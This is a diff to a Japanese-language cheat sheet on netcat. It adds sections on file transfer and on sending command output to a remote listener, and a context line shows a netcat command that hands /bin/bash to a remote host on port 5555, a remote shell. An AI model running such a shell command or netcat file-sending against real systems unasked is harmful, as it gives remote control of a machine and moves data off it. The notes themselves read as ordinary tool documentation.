@@ -41,3 +41,33 @@ $ nc xxx.xxx.xx.xx 5555 -e /bin/bash
 ```
 
 ![img](https://i.imgur.com/DsuIgVh.png)
+
+## ファイル転送
+
+### 送る側
+
+ポートを開いて受付をまつ
+
+```
+nc -lvp 4444 < hoge.txt
+```
+
+### 受け取る側
+
+```
+nc xxx.xxx.xxx.xxx 4444 > out.txt
+```
+
+## コマンドロギング
+
+### ログ受け取り側
+
+```
+nc -lp 9999 >> log.txt
+```
+
+### 送る側(コマンドの実行結果)
+
+```
+date | nc -q 1 xxx.xxx.xxx.xxx 9999 
+```
